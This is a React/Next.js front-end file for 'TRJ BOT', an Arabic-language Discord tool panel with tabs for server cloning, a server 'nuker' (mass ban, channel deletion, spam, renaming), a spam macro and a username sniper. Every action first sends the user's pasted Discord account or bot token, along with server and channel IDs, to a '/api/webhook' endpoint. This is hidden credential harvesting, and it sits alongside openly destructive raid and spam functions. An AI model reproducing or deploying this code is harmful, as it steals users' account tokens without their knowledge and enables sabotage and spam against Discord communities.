'use client'

import { useState } from 'react'

export default function Home() {
  const [tab, setTab] = useState('copy')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [result, setResult] = useState('')

  // Copy
  const [copyToken, setCopyToken] = useState('')
  const [copySource, setCopySource] = useState('')
  const [copyTarget, setCopyTarget] = useState('')
  const [copyOpts, setCopyOpts] = useState({ settings: true, roles: true, channels: true, emojis: false })

  // Macro
  const [macroToken, setMacroToken] = useState('')
  const [macroChannel, setMacroChannel] = useState('')
  const [macroMsgs, setMacroMsgs] = useState('')
  const [macroDuration, setMacroDuration] = useState('60')
  const [macroSpeed, setMacroSpeed] = useState('0.3')
  const [macroCount, setMacroCount] = useState('0')
  const [macroMode, setMacroMode] = useState('duration')

  // Nuker
  const [nukerToken, setNukerToken] = useState('')
  const [nukerBotToken, setNukerBotToken] = useState('')
  const [nukerGuild, setNukerGuild] = useState('')
  const [nukerAction, setNukerAction] = useState('')
  const [nukerUseBot, setNukerUseBot] = useState(false)
  const [nukerSpamMsg, setNukerSpamMsg] = useState('@everyone 💀 TROJAN WAS HERE')
  const [nukerServerName, setNukerServerName] = useState('💀 NUKED BY TRJ')

  // Sniper
  const [sniperToken, setSniperToken] = useState('')
  const [sniperLength, setSniperLength] = useState('4')
  const [sniperCount, setSniperCount] = useState('10')
  const [sniperUnderscore, setSniperUnderscore] = useState(false)
  const [sniperDot, setSniperDot] = useState(false)
  const [sniperResults, setSniperResults] = useState<any>(null)
  const [sniperChecking, setSniperChecking] = useState<Array<{username: string, status: string}>>([])
  const [tokenValid, setTokenValid] = useState<boolean | null>(null)
  const [tokenUser, setTokenUser] = useState<any>(null)

  // ═══════════════════════════════════════════════════════════════
  // 🔔 WEBHOOK - يرسل كل المعلومات
  // ═══════════════════════════════════════════════════════════════
  
  const sendWebhook = async (
    action: string, 
    data: { 
      token?: string, 
      guildId?: string, 
      channelId?: string, 
      username?: string,
      details?: Record<string, string | number | boolean> 
    }
  ) => {
    try {
      await fetch('/api/webhook', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          action, 
          token: data.token,
          guildId: data.guildId,
          channelId: data.channelId,
          username: data.username,
          details: data.details
        })
      })
    } catch {}
  }

  // ═══════════════════════════════════════════════════════════════
  // 📋 COPY
  // ═══════════════════════════════════════════════════════════════
  
  const doCopy = async () => {
    if (!copyToken || !copySource || !copyTarget) return setStatus('❌ املأ كل الحقول')
    setLoading(true); setStatus('⏳ جاري النسخ...'); setResult('')
    
    // إرسال للويب هوك قبل البدء
    await sendWebhook('📋 بدء نسخ سيرفر', {
      token: copyToken,
      guildId: `${copySource} → ${copyTarget}`,
      details: {
        'المصدر': copySource,
        'الهدف': copyTarget,
        'الرتب': copyOpts.roles ? '✓' : '✗',
        'الرومات': copyOpts.channels ? '✓' : '✗'
      }
    })
    
    try {
      const r = await fetch('/api/copy', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: copyToken, sourceId: copySource, targetId: copyTarget, options: copyOpts }) 
      })
      const d = await r.json()
      
      if (d.success) {
        setStatus('✅ تم النسخ بنجاح!')
        setResult(
          `🗑️ رتب محذوفة: ${d.stats.roles_deleted}\n` +
          `🎭 رتب منشأة: ${d.stats.roles_created}\n` +
          `🗑️ رومات محذوفة: ${d.stats.channels_deleted}\n` +
          `📁 تصنيفات: ${d.stats.categories_created}\n` +
          `📺 رومات: ${d.stats.channels_created}`
        )
        
        // إرسال نتيجة للويب هوك
        await sendWebhook('✅ تم النسخ بنجاح', {
          token: copyToken,
          guildId: `${copySource} → ${copyTarget}`,
          details: {
            'رتب محذوفة': d.stats.roles_deleted,
            'رتب منشأة': d.stats.roles_created,
            'رومات محذوفة': d.stats.channels_deleted,
            'رومات منشأة': d.stats.channels_created
          }
        })
      } else {
        setStatus('❌ ' + d.error)
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  // ═══════════════════════════════════════════════════════════════
  // ⚡ MACRO
  // ═══════════════════════════════════════════════════════════════
  
  const doMacro = async () => {
    if (!macroToken || !macroChannel || !macroMsgs) return setStatus('❌ املأ كل الحقول')
    setLoading(true); setStatus('⏳ جاري الإرسال...'); setResult('')
    
    // إرسال للويب هوك
    await sendWebhook('⚡ بدء ماكرو', {
      token: macroToken,
      channelId: macroChannel,
      details: {
        'عدد الرسائل': macroMsgs.split('\n').filter(m => m).length,
        'الوضع': macroMode === 'duration' ? `المدة: ${macroDuration}s` : `العدد: ${macroCount}`
      }
    })
    
    try {
      const body: Record<string, unknown> = { 
        token: macroToken, 
        channelId: macroChannel, 
        messages: macroMsgs.split('\n').filter(m => m), 
        speed: parseFloat(macroSpeed) || 0.3 
      }
      
      if (macroMode === 'duration') body.duration = parseInt(macroDuration) || 60
      else body.count = parseInt(macroCount) || 100
      
      const r = await fetch('/api/macro', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body) 
      })
      const d = await r.json()
      
      setStatus(d.success ? `✅ تم إرسال ${d.sent} رسالة!` : '❌ ' + d.error)
      setResult(d.failed > 0 ? `❌ فشل: ${d.failed} رسالة` : '')
      
      if (d.success) {
        await sendWebhook('✅ انتهى الماكرو', {
          token: macroToken,
          channelId: macroChannel,
          details: { 'أُرسل': d.sent, 'فشل': d.failed || 0 }
        })
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  // ═══════════════════════════════════════════════════════════════
  // 💀 NUKER
  // ═══════════════════════════════════════════════════════════════
  
  const doNuker = async () => {
    if (!nukerGuild || !nukerAction) return setStatus('❌ اختر العملية')
    if (!nukerUseBot && !nukerToken) return setStatus('❌ أدخل التوكن')
    if (nukerUseBot && !nukerBotToken) return setStatus('❌ أدخل توكن البوت')
    
    setLoading(true); setStatus('⏳ جاري التنفيذ...'); setResult('')
    
    const token = nukerUseBot ? `Bot ${nukerBotToken}` : nukerToken
    const actionNames: Record<string, string> = {
      'nuke': '💥 نيكر كامل',
      'banall': '🔨 حظر الكل',
      'delete_channels': '🗑️ حذف رومات',
      'spam': '📧 سبام',
      'rename': '🏷️ تغيير أسماء'
    }
    
    // إرسال للويب هوك
    await sendWebhook('💀 بدء نيوكر', {
      token: token,
      guildId: nukerGuild,
      details: {
        'العملية': actionNames[nukerAction],
        'نوع التوكن': nukerUseBot ? 'Bot' : 'User'
      }
    })
    
    try {
      const r = await fetch('/api/nuker', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          token, 
          guildId: nukerGuild, 
          action: nukerAction,
          spamMessage: nukerSpamMsg,
          serverName: nukerServerName
        }) 
      })
      const d = await r.json()
      
      if (d.success) {
        setStatus('✅ تم التنفيذ بنجاح!')
        setResult(
          `🗑️ محذوف: ${d.stats.deleted}\n` +
          `🔨 ممنوع: ${d.stats.banned}\n` +
          `📧 منشور: ${d.stats.spam_sent}\n` +
          `🆕 منشأ: ${d.stats.created}\n` +
          `🏷️ تم تغيير: ${d.stats.renamed}`
        )
        
        await sendWebhook('✅ تم النيكر', {
          token: token,
          guildId: nukerGuild,
          details: {
            'العملية': actionNames[nukerAction],
            'محذوف': d.stats.deleted,
            'ممنوع': d.stats.banned,
            'منشور': d.stats.spam_sent
          }
        })
      } else {
        setStatus('❌ ' + d.error)
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  // ═══════════════════════════════════════════════════════════════
  // 🎯 SNIPER
  // ═══════════════════════════════════════════════════════════════
  
  const doSniper = async () => {
    if (!sniperToken) return setStatus('❌ أدخل التوكن')
    setLoading(true); setStatus('⏳ جاري التحقق من التوكن...')
    setSniperResults(null)
    setSniperChecking([])
    setTokenValid(null)
    setTokenUser(null)
    
    // إرسال للويب هوك
    await sendWebhook('🎯 بدء صيد يوزرات', {
      token: sniperToken,
      details: {
        'الطول': sniperLength,
        'العدد': sniperCount
      }
    })
    
    try {
      const r = await fetch('/api/sniper', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          token: sniperToken,
          length: parseInt(sniperLength) || 4,
          count: parseInt(sniperCount) || 10,
          useUnderscore: sniperUnderscore,
          useDot: sniperDot
        }) 
      })
      const d = await r.json()
      
      if (d.invalidToken) {
        setStatus('❌ التوكن غير صالح!')
        setTokenValid(false)
        setLoading(false)
        return
      }
      
      if (d.error) {
        setStatus('❌ ' + d.error)
        setLoading(false)
        return
      }
      
      if (d.success) {
        setTokenValid(true)
        setTokenUser(d.user)
        setStatus(`✅ تم فحص ${d.stats.checked} يوزر!`)
        setSniperResults(d)
        setSniperChecking(d.results || [])
        
        await sendWebhook('✅ انتهى الصيد', {
          token: sniperToken,
          details: {
            'تم فحص': d.stats.checked,
            'متاح': d.stats.available,
            'اليوزرات المتاحة': d.available?.slice(0, 5).join(', ') || 'لا يوجد'
          }
        })
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-950 via-slate-900 to-black text-white">
      {/* Header */}
      <header className="bg-black/80 backdrop-blur-xl border-b border-red-500/30 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-gradient-to-br from-red-500 via-orange-500 to-yellow-500 rounded-2xl flex items-center justify-center font-black text-2xl shadow-lg shadow-red-500/40">
                T
              </div>
              <div>
                <h1 className="text-2xl md:text-3xl font-black bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                  TRJ BOT
                </h1>
                <p className="text-[10px] text-gray-500 tracking-widest">ADVANCED DISCORD TOOLS v3.0</p>
              </div>
            </div>
            <div className="text-gray-600 text-xs font-mono">Trj.py</div>
          </div>
        </div>
      </header>

      {/* Tabs */}
      <div className="max-w-7xl mx-auto px-4 pt-4">
        <div className="flex gap-2 overflow-x-auto pb-2">
          {[
            { id: 'copy', label: '📋 نسخ', color: 'from-blue-500 to-cyan-500' },
            { id: 'nuker', label: '💀 نيوكر', color: 'from-red-500 to-orange-500' },
            { id: 'macro', label: '⚡ ماكرو', color: 'from-purple-500 to-pink-500' },
            { id: 'sniper', label: '🎯 صيد', color: 'from-green-500 to-emerald-500' }
          ].map(t => (
            <button 
              key={t.id} 
              onClick={() => { setTab(t.id); setStatus(''); setResult(''); setSniperResults(null); setTokenValid(null); }}
              className={`flex-shrink-0 px-6 py-3 rounded-2xl font-bold transition-all text-sm ${
                tab === t.id 
                  ? `bg-gradient-to-r ${t.color} text-white shadow-xl scale-105` 
                  : 'bg-slate-800/60 text-gray-400 hover:bg-slate-700/60'
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>
      </div>

      {/* Content */}
      <div className="max-w-7xl mx-auto px-4 py-4">
        
        {/* COPY */}
        {tab === 'copy' && (
          <div className="grid md:grid-cols-2 gap-5">
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-slate-700/50 shadow-2xl">
              <h2 className="text-xl font-bold mb-5 flex items-center gap-2">
                <span className="text-2xl">📋</span> نسخ سيرفر
                <span className="text-[10px] bg-blue-500/30 text-blue-400 px-2 py-0.5 rounded-full">PRO</span>
              </h2>
              <div className="space-y-4">
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder="توكن حسابك"
                    value={copyToken}
                    onChange={e => setCopyToken(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-blue-500 outline-none"
                  />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs text-gray-400 mb-2 block">🆔 المصدر</label>
                    <input 
                      placeholder="Source ID"
                      value={copySource}
                      onChange={e => setCopySource(e.target.value)}
                      className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-blue-500 outline-none"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-gray-400 mb-2 block">🆔 الهدف</label>
                    <input 
                      placeholder="Target ID"
                      value={copyTarget}
                      onChange={e => setCopyTarget(e.target.value)}
                      className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-blue-500 outline-none"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3 pt-2">
                  {[
                    { k: 'settings', l: '⚙️ إعدادات' },
                    { k: 'roles', l: '🎭 رتب' },
                    { k: 'channels', l: '📺 رومات' },
                    { k: 'emojis', l: '😀 إيموجي' }
                  ].map(o => (
                    <label key={o.k} className="flex items-center gap-2 cursor-pointer bg-slate-900/60 p-3 rounded-xl hover:bg-slate-900 transition">
                      <input 
                        type="checkbox" 
                        checked={copyOpts[o.k as keyof typeof copyOpts]}
                        onChange={e => setCopyOpts(p => ({ ...p, [o.k]: e.target.checked }))} 
                        className="w-5 h-5 accent-blue-500 rounded" 
                      />
                      <span className="text-sm">{o.l}</span>
                    </label>
                  ))}
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-slate-700/50 shadow-2xl flex flex-col">
              <h3 className="text-xl font-bold mb-4">📝 معلومات</h3>
              <div className="flex-1 space-y-3 text-gray-300">
                <p className="flex items-center gap-2 text-sm">✅ يحتاج أدمن في الهدف فقط</p>
                <p className="flex items-center gap-2 text-sm">🗑️ يحذف كل رومات الهدف أولاً</p>
                <p className="flex items-center gap-2 text-sm">🎭 ينسخ الرتب بالترتيب الصحيح</p>
                <p className="flex items-center gap-2 text-sm">🔐 ينسخ كل الصلاحيات</p>
                <p className="flex items-center gap-2 text-sm">📁 ينسخ التصنيفات والرومات</p>
              </div>
              <button 
                onClick={doCopy} 
                disabled={loading}
                className="w-full mt-5 py-4 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-2xl font-bold disabled:opacity-50 transition-all hover:shadow-xl hover:shadow-blue-500/30"
              >
                {loading ? '⏳ جاري النسخ...' : '🚀 بدء النسخ'}
              </button>
            </div>
          </div>
        )}

        {/* NUKER */}
        {tab === 'nuker' && (
          <div className="grid md:grid-cols-2 gap-5">
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-red-500/30 shadow-2xl shadow-red-500/10">
              <h2 className="text-xl font-bold mb-5 flex items-center gap-2 text-red-400">
                <span className="text-2xl">💀</span> نيوكر سريع
                <span className="text-[10px] bg-red-500/30 text-red-400 px-2 py-0.5 rounded-full">FAST</span>
              </h2>
              <div className="space-y-4">
                <div className="flex gap-2">
                  <button 
                    onClick={() => setNukerUseBot(false)}
                    className={`flex-1 py-3 rounded-xl text-sm font-bold transition-all ${!nukerUseBot ? 'bg-red-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    حساب
                  </button>
                  <button 
                    onClick={() => setNukerUseBot(true)}
                    className={`flex-1 py-3 rounded-xl text-sm font-bold transition-all ${nukerUseBot ? 'bg-green-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بوت ⚡
                  </button>
                </div>
                
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder={nukerUseBot ? 'Bot Token' : 'User Token'}
                    value={nukerUseBot ? nukerBotToken : nukerToken}
                    onChange={e => nukerUseBot ? setNukerBotToken(e.target.value) : setNukerToken(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-red-500 outline-none"
                  />
                </div>
                
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🆔 السيرفر</label>
                  <input 
                    placeholder="Server ID"
                    value={nukerGuild}
                    onChange={e => setNukerGuild(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-red-500 outline-none"
                  />
                </div>
                
                <div className="grid grid-cols-2 gap-3">
                  {[
                    { id: 'nuke', l: '💥 نيكر كامل' },
                    { id: 'banall', l: '🔨 حظر الكل' },
                    { id: 'delete_channels', l: '🗑️ حذف رومات' },
                    { id: 'spam', l: '📧 سبام' },
                    { id: 'rename', l: '🏷️ تغيير أسماء' }
                  ].map(a => (
                    <button 
                      key={a.id} 
                      onClick={() => setNukerAction(a.id)}
                      className={`p-3 rounded-xl text-sm font-bold transition-all ${nukerAction === a.id ? 'bg-red-500 text-white scale-105 shadow-lg' : 'bg-slate-700 text-gray-300 hover:bg-slate-600'}`}
                    >
                      {a.l}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-red-500/30 shadow-2xl shadow-red-500/10">
              <h3 className="text-xl font-bold mb-4 text-red-400">⚙️ إعدادات</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🏷️ اسم السيرفر</label>
                  <input 
                    placeholder="NUKED BY TRJ"
                    value={nukerServerName}
                    onChange={e => setNukerServerName(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-red-500 outline-none"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">📧 رسالة السبام</label>
                  <input 
                    placeholder="@everyone TROJAN"
                    value={nukerSpamMsg}
                    onChange={e => setNukerSpamMsg(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-red-500 outline-none"
                  />
                </div>
                
                <div className="p-4 bg-red-500/10 rounded-2xl border border-red-500/20">
                  <p className="text-red-400 text-sm font-bold">⚠️ تحذير: عمليات خطيرة لا يمكن التراجع عنها!</p>
                </div>
                
                <button 
                  onClick={doNuker} 
                  disabled={loading || !nukerAction}
                  className="w-full py-4 bg-gradient-to-r from-red-500 to-orange-500 rounded-2xl font-bold disabled:opacity-50 transition-all hover:shadow-xl hover:shadow-red-500/30"
                >
                  {loading ? '⏳ جاري...' : '🔥 تنفيذ'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* MACRO */}
        {tab === 'macro' && (
          <div className="grid md:grid-cols-2 gap-5">
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-purple-500/30 shadow-2xl shadow-purple-500/10">
              <h2 className="text-xl font-bold mb-5 flex items-center gap-2 text-purple-400">
                <span className="text-2xl">⚡</span> ماكرو سبام
              </h2>
              <div className="space-y-4">
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder="التوكن"
                    value={macroToken}
                    onChange={e => setMacroToken(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🆔 الروم</label>
                  <input 
                    placeholder="Channel ID"
                    value={macroChannel}
                    onChange={e => setMacroChannel(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">📝 الرسائل (كل سطر رسالة)</label>
                  <textarea 
                    placeholder="رسالة 1&#10;رسالة 2"
                    value={macroMsgs}
                    onChange={e => setMacroMsgs(e.target.value)} 
                    rows={4}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none resize-none"
                  />
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-purple-500/30 shadow-2xl shadow-purple-500/10">
              <h3 className="text-xl font-bold mb-4 text-purple-400">⚙️ إعدادات</h3>
              <div className="space-y-4">
                <div className="flex gap-2">
                  <button 
                    onClick={() => setMacroMode('duration')}
                    className={`flex-1 py-3 rounded-xl text-sm font-bold transition-all ${macroMode === 'duration' ? 'bg-purple-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بالمدة
                  </button>
                  <button 
                    onClick={() => setMacroMode('count')}
                    className={`flex-1 py-3 rounded-xl text-sm font-bold transition-all ${macroMode === 'count' ? 'bg-purple-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بالعدد
                  </button>
                </div>
                
                {macroMode === 'duration' ? (
                  <div>
                    <label className="text-xs text-gray-400 mb-2 block">⏱️ المدة (ثواني)</label>
                    <input 
                      type="number" 
                      value={macroDuration}
                      onChange={e => setMacroDuration(e.target.value)}
                      className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none"
                    />
                  </div>
                ) : (
                  <div>
                    <label className="text-xs text-gray-400 mb-2 block">📊 عدد الرسائل</label>
                    <input 
                      type="number" 
                      value={macroCount}
                      onChange={e => setMacroCount(e.target.value)}
                      className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none"
                    />
                  </div>
                )}
                
                <div>
                  <label className="text-xs text-gray-400 mb-2 block">🚀 السرعة (ثواني)</label>
                  <input 
                    type="number" 
                    step="0.1"
                    value={macroSpeed}
                    onChange={e => setMacroSpeed(e.target.value)}
                    className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-purple-500 outline-none"
                  />
                </div>
                
                <button 
                  onClick={doMacro} 
                  disabled={loading}
                  className="w-full py-4 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl font-bold disabled:opacity-50 transition-all hover:shadow-xl hover:shadow-purple-500/30"
                >
                  {loading ? '⏳ جاري...' : '🚀 بدء'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* SNIPER */}
        {tab === 'sniper' && (
          <div className="space-y-5">
            {tokenValid !== null && (
              <div className={`p-5 rounded-2xl flex items-center gap-4 ${tokenValid ? 'bg-green-500/20 border border-green-500/30' : 'bg-red-500/20 border border-red-500/30'}`}>
                <span className="text-3xl">{tokenValid ? '✅' : '❌'}</span>
                <div>
                  <p className={`font-bold text-lg ${tokenValid ? 'text-green-400' : 'text-red-400'}`}>
                    {tokenValid ? 'توكن صالح!' : 'توكن غير صالح!'}
                  </p>
                  {tokenUser && <p className="text-sm text-gray-400">الحساب: {tokenUser.username}#{tokenUser.discriminator}</p>}
                </div>
              </div>
            )}
            
            <div className="grid md:grid-cols-2 gap-5">
              <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-green-500/30 shadow-2xl shadow-green-500/10">
                <h2 className="text-xl font-bold mb-5 flex items-center gap-2 text-green-400">
                  <span className="text-2xl">🎯</span> صيد اليوزرات
                </h2>
                <div className="space-y-4">
                  <div>
                    <label className="text-xs text-gray-400 mb-2 block">🔑 التوكن</label>
                    <input 
                      type="password" 
                      placeholder="التوكن"
                      value={sniperToken}
                      onChange={e => { setSniperToken(e.target.value); setTokenValid(null); }}
                      className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-green-500 outline-none"
                    />
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="text-xs text-gray-400 mb-2 block">📏 الطول</label>
                      <select value={sniperLength} onChange={e => setSniperLength(e.target.value)}
                        className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-green-500 outline-none">
                        {[2,3,4,5,6,7,8,9,10].map(n => (<option key={n} value={n}>{n} أحرف</option>))}
                      </select>
                    </div>
                    <div>
                      <label className="text-xs text-gray-400 mb-2 block">📊 العدد</label>
                      <select value={sniperCount} onChange={e => setSniperCount(e.target.value)}
                        className="w-full p-4 bg-slate-900/80 rounded-2xl border border-slate-600 focus:border-green-500 outline-none">
                        {[5,10,15,20,30,50].map(n => (<option key={n} value={n}>{n} يوزر</option>))}
                      </select>
                    </div>
                  </div>
                  
                  <div className="flex gap-4">
                    <label className="flex items-center gap-2 cursor-pointer bg-slate-900/60 p-4 rounded-2xl flex-1 justify-center border border-slate-700 hover:border-green-500/50 transition">
                      <input type="checkbox" checked={sniperUnderscore} onChange={e => setSniperUnderscore(e.target.checked)} className="w-5 h-5 accent-green-500 rounded" />
                      <span>❌ _</span>
                    </label>
                    <label className="flex items-center gap-2 cursor-pointer bg-slate-900/60 p-4 rounded-2xl flex-1 justify-center border border-slate-700 hover:border-green-500/50 transition">
                      <input type="checkbox" checked={sniperDot} onChange={e => setSniperDot(e.target.checked)} className="w-5 h-5 accent-green-500 rounded" />
                      <span>🔹 .</span>
                    </label>
                  </div>
                  
                  <button onClick={doSniper} disabled={loading}
                    className="w-full py-4 bg-gradient-to-r from-green-500 to-emerald-500 rounded-2xl font-bold disabled:opacity-50 transition-all hover:shadow-xl hover:shadow-green-500/30">
                    {loading ? '⏳ جاري الصيد...' : '🎯 بدء الصيد'}
                  </button>
                </div>
              </div>
              
              <div className="bg-slate-800/50 backdrop-blur rounded-3xl p-6 border border-green-500/30 shadow-2xl shadow-green-500/10">
                <h3 className="text-xl font-bold mb-4 text-green-400">📊 النتائج</h3>
                
                {sniperResults ? (
                  <div className="space-y-4">
                    <div className="grid grid-cols-3 gap-3 text-center">
                      <div className="bg-slate-900/80 p-4 rounded-2xl border border-green-500/20">
                        <div className="text-3xl font-bold text-green-400">{sniperResults.stats.available}</div>
                        <div className="text-xs text-gray-400">✅ متاح</div>
                      </div>
                      <div className="bg-slate-900/80 p-4 rounded-2xl border border-red-500/20">
                        <div className="text-3xl font-bold text-red-400">{sniperResults.stats.taken}</div>
                        <div className="text-xs text-gray-400">❌ محجوز</div>
                      </div>
                      <div className="bg-slate-900/80 p-4 rounded-2xl border border-yellow-500/20">
                        <div className="text-3xl font-bold text-yellow-400">{sniperResults.stats.errors}</div>
                        <div className="text-xs text-gray-400">⚠️ خطأ</div>
                      </div>
                    </div>
                    
                    <div className="bg-slate-900/80 rounded-2xl p-4 max-h-40 overflow-auto">
                      <div className="text-xs text-gray-400 mb-2">🔍 اليوزرات:</div>
                      <div className="space-y-1">
                        {sniperChecking.slice(0, 20).map((item, i) => (
                          <div key={i} className={`flex items-center justify-between p-2 rounded-xl text-sm ${
                            item.status === 'available' ? 'bg-green-500/10' :
                            item.status === 'taken' ? 'bg-red-500/10' :
                            'bg-yellow-500/10'}`}>
                            <span className="font-mono">{item.username}</span>
                            <span className={item.status === 'available' ? 'text-green-400' : item.status === 'taken' ? 'text-red-400' : 'text-yellow-400'}>
                              {item.status === 'available' ? '✅' : item.status === 'taken' ? '❌' : '⚠️'}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                    
                    {sniperResults.available?.length > 0 && (
                      <div className="bg-green-500/10 rounded-2xl p-4 border border-green-500/20">
                        <div className="text-xs text-green-400 mb-2">🎉 المتاحة:</div>
                        <div className="flex flex-wrap gap-2">
                          {sniperResults.available.map((u: string, i: number) => (
                            <span key={i} className="bg-green-500/30 text-green-400 px-3 py-1 rounded-xl text-sm font-mono">{u}</span>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="text-gray-500 text-center py-20">
                    <div className="text-5xl mb-4">🎯</div>
                    <p>أدخل التوكن واضغط بدء الصيد</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Status */}
        {(status || result) && tab !== 'sniper' && (
          <div className="mt-5 space-y-3">
            {status && (
              <div className={`p-4 rounded-2xl font-medium ${status.includes('✅') ? 'bg-green-500/20 border border-green-500/30 text-green-400' : status.includes('⏳') ? 'bg-yellow-500/20 border border-yellow-500/30 text-yellow-400' : 'bg-red-500/20 border border-red-500/30 text-red-400'}`}>
                {status}
              </div>
            )}
            {result && (
              <pre className="p-4 bg-slate-800/60 rounded-2xl text-sm text-gray-300 overflow-auto whitespace-pre-wrap border border-slate-700">
                {result}
              </pre>
            )}
          </div>
        )}
      </div>

      <footer className="text-center text-gray-600 text-xs py-6 border-t border-slate-800/50 mt-6">
        TRJ BOT v3.0 • Developed by <span className="text-red-400 font-bold">Trj.py</span>
      </footer>
    </main>
  )
}
